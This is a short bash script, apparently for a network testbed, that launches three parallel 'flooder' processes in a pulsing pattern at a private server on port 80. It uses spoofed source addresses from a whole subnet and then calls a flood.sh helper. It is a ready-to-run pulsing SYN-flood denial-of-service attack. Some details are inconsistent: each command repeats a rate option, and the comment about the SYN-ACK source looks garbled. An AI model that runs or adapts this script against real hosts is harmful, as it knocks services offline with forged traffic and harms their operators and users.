#!/bin/bash
SERVER_IP="10.1.5.2"

sudo flooder --dst $SERVER_IP --highrate 75000 --dportmin 80 --dportmax 80 --proto 6 --src 10.1.5.0 --srcmask 255.255.255.0 --ratetype pulse --lowrate 0 --lowtime 5000 --highrate 75000 --hightime 10000 &
sudo flooder --dst $SERVER_IP --highrate 75000 --dportmin 80 --dportmax 80 --proto 6 --src 10.1.5.0 --srcmask 255.255.255.0 --ratetype pulse --lowrate 0 --lowtime 5000 --highrate 75000 --hightime 10000 &
sudo flooder --dst $SERVER_IP --highrate 75000 --dportmin 80 --dportmax 80 --proto 6 --src 10.1.5.0 --srcmask 255.255.255.0 --ratetype pulse --lowrate 0 --lowtime 5000 --highrate 75000 --hightime 10000 &

# The server will send a SYN-ACK from 10.1.5.0
./flood.sh $SERVER_IP 80 10.1.5.0 255.255.255.255 6 75000 &